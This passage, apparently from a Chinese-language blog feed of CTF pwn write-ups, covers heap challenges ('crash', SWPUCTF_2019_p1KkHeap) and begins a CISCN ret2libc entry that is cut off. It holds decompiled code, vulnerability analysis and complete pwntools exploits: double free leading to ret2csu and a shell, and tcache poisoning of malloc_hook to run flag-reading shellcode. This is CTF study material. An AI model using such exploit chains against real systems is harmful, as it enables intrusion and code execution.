!*((_DWORD *)&amp;Strings + <span class="number">4</span> * i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_DWORD *)&amp;Strings + <span class="number">4</span> * i) = <span class="number">1</span>;</span><br><span class="line">        qword_2020E8[<span class="number">2</span> * i] = ptr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The string id is %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;The string list is full&quot;</span>);</span><br><span class="line">      (*((<span class="keyword">void</span> (__fastcall **)(<span class="keyword">char</span> *))ptr + <span class="number">3</span>))(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>freeLong 的汇编代码如下， freeShort 和 它差不多都存在UAF</p>
<p><img src="http://static.zybuluo.com/hgggg/mk8t3gtc5l76hghd8wst9ent/36.png" alt="36.png-28.6kB"></p>
<p>主要的漏洞点在Delete</p>
<p><img src="http://static.zybuluo.com/hgggg/0kdpfqzbu2bg4gev9rppwe3w/37.png" alt="37.png-48.5kB"></p>
<h4 id="利用方式"><a class="header-anchor" href="#利用方式">¶</a>利用方式</h4>
<pre><code>    IDA 中可以看到 call puts 与 freeShort 和 freeLong在同一
页，这样的话如果我们可以利用double free覆盖freeLong的地址的后两位
为call puts的地址,当我们delete的时候就会调用call puts 打印出字符
串地址开始的内容，call puts 的地址就在这串内容里，这样可以泄露程序
基址。

拿到程序地址之后就可以结合double free 利用delete的里溢出来ret2csu

bss段没有足够的空间来写入/bin/sh所以要往data段写
</code></pre>
<p>具体不多说(<s>主要是懒</s>)：直接上exp</p>
<h4 id="exp-v2"><a class="header-anchor" href="#exp-v2">¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p  = process(<span class="string">&quot;crash&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;crash&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;192.168.43.181&#x27;,55000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;add &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Pls give data size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Are you sure?:&#x27;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x0b\x00&#x27;</span>) </span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xd0b</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000000119c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000a80 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000929 : ret</span></span><br><span class="line"><span class="string">0x0000000000000962 : ret 0x2016</span></span><br><span class="line"><span class="string">0x000000000000102b : ret 0x8b48</span></span><br><span class="line"><span class="string">0x0000000000000dd2 : ret 0x8d48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = elf_base + <span class="number">0x11a3</span></span><br><span class="line">puts_plt = elf_base + elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf_base + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf_base + elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_4 = elf_base + <span class="number">0x119c</span></span><br><span class="line">read_got = elf_base + elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_6 = elf_base + <span class="number">0x119a</span></span><br><span class="line">rop2 = elf_base + <span class="number">0x1180</span></span><br><span class="line">bin_sh = elf_base + <span class="number">0x202080</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4)) <span class="comment">#0</span></span><br><span class="line">payload1 = p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_6)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">8</span>)+p64(bin_sh)+p64(<span class="number">0</span>)+p64(rop2)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">56</span>+p64(main)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;yes\x00\x00\x00\x00\x00&quot;</span> + payload1</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4)) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">payload2 = p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(main)</span><br><span class="line">payload2 = <span class="string">b&#x27;yes&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + payload2</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>##参考链接<br>
<a href="https://blog.csdn.net/qq_35429581/article/details/78231443">https://blog.csdn.net/qq_35429581/article/details/78231443</a><br>
<a href="https://www.cnblogs.com/luoleqi/p/12343147.html">https://www.cnblogs.com/luoleqi/p/12343147.html</a><br>
<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698">https://blog.csdn.net/Breeze_CAT/article/details/103788698</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn笔记</tag>
        <tag>glibc堆</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF pwn 刷题记录(持续更新)</title>
    <url>/2021/10/04/NSSCTF%20pwn%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/29.jpg" alt="pic"></p>
<span id="more"></span>
<p>这是一个记录在NSSCTF平台上刷pwn题的博客，题目顺序按照刷题的先后顺序</p>
<h2 id="SWPUCTF-2019-p1KkHeap"><a class="header-anchor" href="#SWPUCTF-2019-p1KkHeap">¶</a>SWPUCTF_2019_p1KkHeap</h2>
<h3 id="题目考点"><a class="header-anchor" href="#题目考点">¶</a>题目考点</h3>
<pre><code>1.tacahe bin attact
2.unsorted bin attact
3.malloc hook
</code></pre>
<h3 id="函数"><a class="header-anchor" href="#函数">¶</a>函数</h3>
<p>main 其中的各种功能只能调用18次</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v3; // rdi</span><br><span class="line">  int v4; // eax</span><br><span class="line"></span><br><span class="line">  sub_B0A();</span><br><span class="line">  v3 = &quot;                           Welcome to SWPUCTF 2019&quot;;</span><br><span class="line">  puts(&quot;                           Welcome to SWPUCTF 2019&quot;);</span><br><span class="line">  while ( dword_202024 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_10C5();</span><br><span class="line">    v4 = sub_1076(v3, a2);</span><br><span class="line">    if ( v4 == 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_EC1();</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v4 &gt; 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v4 == 5 )</span><br><span class="line">        ((void (*)(void))sub_E04)();</span><br><span class="line">      if ( v4 &lt; 5 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_FD1();</span><br><span class="line">      &#125;</span><br><span class="line">      else if ( v4 == 666 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = &quot;p1Kk wants a boyfriend!&quot;;</span><br><span class="line">        puts(&quot;p1Kk wants a boyfriend!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v4 == 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_E1E();</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v4 == 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_F58();</span><br><span class="line">    &#125;</span><br><span class="line">    --dword_202024;                             // 18</span><br><span class="line">  &#125;</span><br><span class="line">  sub_E04(v3, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sub_BA0  完成初始化以及沙盒,通过seccomp-tools得知禁用了one_gadget系统调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setbuf(stdin, 0LL);</span><br><span class="line">setbuf(stdout, 0LL);</span><br><span class="line">setbuf(stderr, 0LL);</span><br><span class="line">fd = open(&quot;./logo&quot;, 4);</span><br><span class="line">read(fd, &amp;unk_202140, 0x10932uLL);</span><br><span class="line">write(1, &amp;unk_202140, 0x10932uLL);</span><br><span class="line">write(1, asc_202040, 0x52uLL);</span><br><span class="line">close(fd);</span><br><span class="line">if ( mmap((void *)0x66660000, 0x1000uLL, 7, 34, -1, 0LL) != (void *)1717960704 )// 在0x66660000处映射了0x1000大小的内存</span><br><span class="line">  exit(-1);</span><br><span class="line">memset((void *)0x66660000, 0, 0x1000uLL);</span><br><span class="line">strcpy((char *)0x66660000, &quot;SWPUCTF_p1Kk&quot;);</span><br><span class="line">prctl(38, 1LL, 0LL, 0LL, 0LL);                // 沙箱禁用</span><br></pre></td></tr></table></figure>
<p>add</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_E1E(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  size_t size; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;size: &quot;);</span><br><span class="line">  size = sub_1076();</span><br><span class="line">  if ( size &gt; 0x100 )                           // 最大申请0x100</span><br><span class="line">    sub_E04(&quot;size: &quot;, a2);</span><br><span class="line">  v3 = sub_DA9();</span><br><span class="line">  if ( v3 &lt;= 7 )                                // 最多申请7个</span><br><span class="line">  &#123;</span><br><span class="line">    qword_202100[v3] = malloc(size);</span><br><span class="line">    dword_2020E0[v3] = size;</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>delete</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_FD1(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( dword_202020 &lt;= 0 )</span><br><span class="line">    sub_E04(a1, a2);</span><br><span class="line">  printf(&quot;id: &quot;);</span><br><span class="line">  v3 = sub_1076();</span><br><span class="line">  if ( v3 &gt; 7 )</span><br><span class="line">    sub_E04(&quot;id: &quot;, a2);</span><br><span class="line">  free((void *)qword_202100[v3]);</span><br><span class="line">  dword_2020E0[v3] = 0;                         // 这里只把大小清零，却没把指针清零 存在UAF</span><br><span class="line">  --dword_202020;                               // dword_202020=3，只能free三次</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_F58(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;id: &quot;);</span><br><span class="line">  v3 = sub_1076();</span><br><span class="line">  if ( v3 &gt; 7 )</span><br><span class="line">    sub_E04(&quot;id: &quot;, a2);</span><br><span class="line">  printf(&quot;content: &quot;);</span><br><span class="line">  puts((const char *)qword_202100[v3]);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>edit</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_EC1(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;id: &quot;);</span><br><span class="line">  v3 = sub_1076();</span><br><span class="line">  if ( v3 &gt; 7 )</span><br><span class="line">    sub_E04(&quot;id: &quot;, a2);</span><br><span class="line">  printf(&quot;content: &quot;);</span><br><span class="line">  read(0, *((void **)&amp;qword_202100 + v3), dword_2020E0[v3]);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="攻击思路"><a class="header-anchor" href="#攻击思路">¶</a>攻击思路</h3>
<p>这里是转自星盟的ha1vk师傅的攻击思路</p>
<p>我们该如何触发shellcode或ROP，在这，我们可以攻击__malloc_hook，将shellcode的地址写入到__malloc_hook，在这里，ROP显然很麻烦，因为ROP还要做栈转移，并且需要先前依靠一段shellcode来转移栈，如果供我们存放shellcode的地方空间很小，那么我们可以考虑写一段简短的shellcode，将栈转移，但是，如果我们有足够的空间来放shellcode，那么，直接把读取和输出flag的shellcode写到那个空间。</p>
<p>对于可写shellcode的空间很小，我还想到了另外一种方法，那就是写一段简短的shellcode，来调用int mprotect(const void *start, size_t len, int prot)函数，将某地址处属性修改为可执行，比如，我们可以把某个堆修改为可执行，那么就能在堆里布下shellcode。</p>
<p>程序在0x66660000这个固定的地址处映射了0x1000大小的空间，并且属性为RWX，既可读写，也具有执行属性，并且地址固定为0x66660000，使得我们更加方便。</p>
<p>所以，我们决定把shellcode写到0x66660000处，然后攻击malloc_hook,在malloc_hook处写入0x66660000，这样，当我们再次malloc时，就会执行shellcode。</p>
<p>首先，需要泄露一些地址，那么需要用到unsorted bin，但是，由于tcache的存在，对应的tcache bin满7个，接下来的堆块才会放入unsorted bin。满7个，就必须delete 7次，本题最多只能用3次，显然这个方案不可行。</p>
<p>下面是tcache的源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct malloc_par  </span><br><span class="line">&#123;  </span><br><span class="line">  /* Tunable parameters */  </span><br><span class="line">  unsigned long trim_threshold;  </span><br><span class="line">  INTERNAL_SIZE_T top_pad;  </span><br><span class="line">  INTERNAL_SIZE_T mmap_threshold;  </span><br><span class="line">  INTERNAL_SIZE_T arena_test;  </span><br><span class="line">  INTERNAL_SIZE_T arena_max;  </span><br><span class="line">  </span><br><span class="line">  /* Memory map support */  </span><br><span class="line">  int n_mmaps;  </span><br><span class="line">  int n_mmaps_max;  </span><br><span class="line">  int max_n_mmaps;  </span><br><span class="line">  /* the mmap_threshold is dynamic, until the user sets </span><br><span class="line">     it manually, at which point we need to disable any </span><br><span class="line">     dynamic behavior. */  </span><br><span class="line">  int no_dyn_threshold;  </span><br><span class="line">  </span><br><span class="line">  /* Statistics */  </span><br><span class="line">  INTERNAL_SIZE_T mmapped_mem;  </span><br><span class="line">  INTERNAL_SIZE_T max_mmapped_mem;  </span><br><span class="line">  </span><br><span class="line">  /* First address handed out by MORECORE/sbrk.  */  </span><br><span class="line">  char *sbrk_base;  </span><br><span class="line">  </span><br><span class="line">#if USE_TCACHE  </span><br><span class="line">  /* Maximum number of buckets to use.  */  </span><br><span class="line">  size_t tcache_bins;  </span><br><span class="line">  size_t tcache_max_bytes;  </span><br><span class="line">  /* Maximum number of chunks in each bucket.  */  </span><br><span class="line">  size_t tcache_count;  </span><br><span class="line">  /* Maximum number of chunks to remove from the unsorted list, which </span><br><span class="line">     aren&#x27;t used to prefill the cache.  */  </span><br><span class="line">  size_t tcache_unsorted_limit;  </span><br><span class="line">#endif  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line">static struct malloc_par mp_ =  </span><br><span class="line">&#123;  </span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,  </span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,  </span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,  </span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,  </span><br><span class="line">#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))  </span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (1)  </span><br><span class="line">#if USE_TCACHE  </span><br><span class="line">  ,  </span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,  </span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,  </span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS-1),  </span><br><span class="line">  .tcache_unsorted_limit = 0 /* No limit.  */  </span><br><span class="line">#endif  </span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure>
<p>注意，size_t tcache_bins;是无符号的，但是 tcache-&gt;counts[tc_idx]是有符号数组</p>
<p>当一个有符号数和一个无符号数进行比较时，有符号数会先转换成无符号数，然后再进行比较。</p>
<p>那么，假设，我们double free同一个堆，那么在tcache bin里就会构成循环链表，此时count=2，然后，我们再create 3个一样大小的堆，那么count就变成了-1,此时，我们再delete一个unsorted bin范围的堆，这个堆就会放入unsorted bin，然后我们用show功能就能泄露出libc中的指针。</p>
<p>但是该程序只能free3次，所以我们用一次攻击，直接去攻击tcache bin的表头，那么，下次，我们就能直接修改表头，来决定下一次堆分配到哪个地方。</p>
<h3 id="exp"><a class="header-anchor" href="#exp">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF (<span class="string">&#x27;/home/hgg/Desktop/pwn/heap/pwn1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/hgg/Desktop/pwn/heap/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="number">1.14</span><span class="number">.71</span><span class="number">.254</span>:<span class="number">28070</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#tcache_dup</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#1_chunk get tcache_entry</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">first_chunk=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">tcache_entry=first_chunk-<span class="number">0x198</span>-<span class="number">0x110</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(tcache_entry))</span><br><span class="line"><span class="comment">#edit fd -&gt; tache_entry</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(tcache_entry))</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#3 </span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4 get tcache_entry</span></span><br><span class="line">rwx_add=<span class="number">0x66660000</span></span><br><span class="line">edit(<span class="number">4</span>,p64(rwx_add))<span class="comment">#edit tcache_entry</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#5 get rwx memory</span></span><br><span class="line"><span class="comment">#write shellcode</span></span><br><span class="line">shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="number">3</span>,<span class="number">0x66660100</span>,<span class="number">64</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,<span class="number">0x66660100</span>,<span class="number">64</span>)</span><br><span class="line">edit(<span class="number">5</span>,asm(shellcode))</span><br><span class="line"><span class="comment">#tcache_count is -1(0xff) now</span></span><br><span class="line"><span class="comment">#unsortbin attack</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">libc_base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#malloc_hijack</span></span><br><span class="line">malloc_hook=libc_base+<span class="number">0x3ebc30</span></span><br><span class="line">edit(<span class="number">4</span>,p64(malloc_hook))<span class="comment">#edit tcache_entry</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#6 get malloc_hook</span></span><br><span class="line">edit(<span class="number">6</span>,p64(rwx_add))</span><br><span class="line"><span class="comment">#getflag</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019东北-PWN2"><a class="header-anchor" href="#CISCN-2019东北-PWN2">¶</a>CISCN 2019东北 PWN2</h2>
<h3 id="IDA分析"><a class="header-anchor" href="#IDA分析">¶</a>IDA分析</h3>
<p>encrypt 函数中有个栈溢出，这题直接ret2libc</p>
<p><img src="http://static.zybuluo.com/hgggg/8o7absc9hgkjttq01vk27xh9/2.png" alt="2.png-39.5kB"></p>
<h3 id="exp-v2"><a class="header-anchor" href="#exp-v2">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF (<span class="string">&#x27;/home/hgg/Desktop/pwn/pwn2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/hgg/Desktop/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c80 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c82 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c7f : pop rbp ; 